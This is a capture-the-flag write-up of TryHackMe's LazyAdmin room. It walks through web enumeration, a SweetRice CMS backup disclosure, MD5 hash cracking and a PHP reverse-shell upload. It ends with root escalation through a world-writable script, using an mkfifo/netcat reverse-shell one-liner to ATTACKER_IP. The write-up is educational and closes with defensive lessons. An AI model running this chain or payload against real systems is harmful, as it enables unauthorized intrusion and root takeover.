# TryHackMe - LazyAdmin Write-Up


A beginner-friendly walkthrough of the LazyAdmin room on TryHackMe. This room demonstrates how exposed backups, weak password hashing, and misconfigured file permissions can lead to full system compromise.


---
 Room Information

| Category | Details |
|-----------|----------|
| Room | LazyAdmin |
| Platform | TryHackMe |
| Difficulty | Easy |
| Target OS | Linux (Ubuntu) |

---

#  Skills Learned

- Web Enumeration
- Directory Brute Forcing
- CMS Version Discovery
- Exploiting Backup Disclosure
- Password Hash Cracking
- Reverse Shell Upload
- Linux Privilege Escalation
- Exploiting Misconfigured File Permissions

---

#  Penetration Testing Methodology

1. Reconnaissance
2. Web Enumeration
3. Backup Disclosure Exploitation
4. Credential Extraction
5. Hash Cracking
6. Initial Access
7. User Flag Retrieval
8. Privilege Escalation
9. Root Flag Retrieval

---





#  Step 1: Reconnaissance

The first step was identifying accessible services on the target.
I used Nmap to scan for open ports on the target machine.

```bash
nmap -sV -sC <target-ip>
```
After nmap scan, Port 80 was found to be open. 
### Nmap Scan
<img width="950" height="218" alt="nmap" src="https://github.com/user-attachments/assets/b0063c4c-07ca-46fb-bec6-0d4b5dbde9be" />
### Web Application

<img width="836" height="238" alt="Screenshot 2026-06-10 005632" src="https://github.com/user-attachments/assets/1c74036e-508c-42f1-b1d2-9281ad154980" />






Since a web application was available, directory enumeration was performed to discover hidden files and folders.

## Directory Enumeration

```bash
feroxbuster -u http://TARGET_IP/content/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
```


### Result

Feroxbuster discovered an exposed directory:

```text
/content/
/content/as/lib/
/content/inc
/changelog.txt
/images

```      
### Why?

Directory enumeration helps discover hidden files and folders that may expose sensitive information, administrative panels, backups, or configuration files.
Directory listing was enabled, allowing us to browse files directly.

Inside the directory, we identified the CMS as:

```text
SweetRice CMS Version 1.5.0
```
<img width="888" height="284" alt="cms version" src="https://github.com/user-attachments/assets/5456e01b-f2cd-486b-9ae2-4d9df4052bda" />


---

#  Step 2: Finding a Known Vulnerability

After identifying the CMS version, we searched for publicly known vulnerabilities.

```bash
searchsploit sweetrice
```

### Result

A vulnerability named:

```text
SweetRice 1.5.0 - Backup Disclosure (40718)
```

was discovered.

Copy the exploit documentation locally:

```bash
searchsploit -m 40718
```

---



#  Step 3: Exploiting Backup Disclosure

Reading the exploit documentation revealed that SweetRice stores database backups in a predictable location.

## Backup Location

```text
/content/inc/mysql_backup/
```

Browsing to that directory revealed an exposed SQL backup file:

```text
mysql_bakup_20191129023059-1.5.1.sql
```

Download and inspect the file.

### Why?

Database backups frequently contain usernames, password hashes, email addresses, and other sensitive information.

---

#  Step 4: Extracting Credentials

Inside the SQL dump, administrator account details were found.
<img width="1102" height="399" alt="backupcreditial" src="https://github.com/user-attachments/assets/86f3d851-0108-4c5f-a17d-0b88a9afc65f" />


```text
Username: manager
Password Hash: 42f**********************
```

The hash appeared to be MD5.

---

#  Step 5: Cracking the Password

The password hash was cracked using an online hash cracking service such as CrackStation.

<img width="1512" height="532" alt="crackstation" src="https://github.com/user-attachments/assets/f4a0e53e-8c89-41a7-9a73-b845235187c0" />


```text
42f749ade7f9******************
```

### Result

```text
Password: Passw******
```

> Note: Your discovered password should match the room's actual credentials.


---

#  Step 6: Initial Access

Using the recovered credentials, we logged into the SweetRice administration panel.

## Login Page

```text
http://TARGET_IP/content/as/
```

<img width="1173" height="926" alt="Screenshot_2026-06-09_09_21_35" src="https://github.com/user-attachments/assets/231d7462-b75b-4d19-8381-00d240e2903c" />


### Credentials

```text
Username: manager
Password: Passw******
```

After successful authentication, administrative access to the CMS was obtained.

---

#  Step 7: Uploading a Reverse Shell

The admin panel allowed file uploads.

A PHP reverse shell was uploaded after modifying the callback IP address and listening port.

## Start a Netcat Listener

```bash
nc -lvnp 4444
```

## Trigger the Shell

Navigate to the uploaded PHP file through the browser.

### Result

A reverse shell connected back to the attacking machine.

```text
www-data
```

We now had command execution on the target system.

---

#  Step 8: Capture the User Flag

Navigate to the user's home directory.

```bash
cd /home/itguy
cat user.txt
```

The first flag was successfully obtained.

---

#  Step 9: Privilege Escalation

Now the goal was to become root.

## Check Sudo Permissions

```bash
sudo -l
```
<img width="1092" height="195" alt="sudo -l" src="https://github.com/user-attachments/assets/7dee75d1-6ef4-445b-a4a7-f57e61fc9829" />


### Result

```text
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

This means the current user could execute the Perl script as root without providing a password.

---

#  Step 10: Analyzing the Backup Script

Inspect the script:

```bash
cat /home/itguy/backup.pl
```

Contents:

```perl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

The Perl script simply executes another script:

```text
/etc/copy.sh
```

---

#  Step 11: Finding the Misconfiguration

Check permissions on the script being executed.

```bash
ls -la /etc/copy.sh
```
<img width="657" height="103" alt="Screenshot_2026-06-09_10-42-10" src="https://github.com/user-attachments/assets/2317396e-4399-4234-afaa-cb39fe356d03" />


### Result

```text
-rw-r--rwx
```

The important part is:

```text
rwx
```

for "Others".

This means any user on the system can modify the file.

### Why is this dangerous?

The Perl script runs as root.

If we can modify `/etc/copy.sh`, we can force root to execute any command we choose.

---

#  Step 12: Exploiting the Vulnerability

Start another listener:

```bash
nc -lvnp 4444
```
<img width="1030" height="141" alt="Screenshot_2026-06-09_11-28-23" src="https://github.com/user-attachments/assets/a9de7bc6-32e5-484e-be01-520f9e52f46b" />


Overwrite the script with a reverse shell payload:

```bash
echo "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 >/tmp/f" > /etc/copy.sh
```

Execute the allowed sudo command:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

---

#  Step 13: Root Access

A new connection was received on the listener.

Verify privileges:

```bash
whoami
```

Output:

```text
root
```

Root access successfully achieved.

---

#  Capture the Root Flag

Navigate to the root directory:

```bash
cd /root
cat root.txt
```

The final flag was obtained.

---

#  Lessons Learned

### 1. Exposed Backup Files Are Dangerous

Database backups should never be publicly accessible through a web server.

### 2. Disable Directory Listing

Directory indexing exposed sensitive files and helped identify the CMS version.

### 3. Avoid Weak Hashing Algorithms

MD5 hashes are outdated and easily cracked.

Use modern algorithms such as:

- bcrypt
- scrypt
- Argon2

### 4. Follow Least Privilege

Scripts executed by privileged users should never be writable by unprivileged users.

### 5. Regular Permission Audits

Misconfigured permissions on system scripts can directly lead to root compromise.

---

#  Conclusion

The LazyAdmin room demonstrates a realistic attack chain:

1. Enumerate hidden web directories
2. Discover CMS version information
3. Exploit exposed database backups
4. Recover administrator credentials
5. Gain web-based remote code execution
6. Abuse weak sudo configuration and writable scripts
7. Escalate privileges to root

This room is an excellent introduction to web enumeration, credential attacks, reverse shells, and Linux privilege escalation techniques.

---
**Room Completed Successfully **


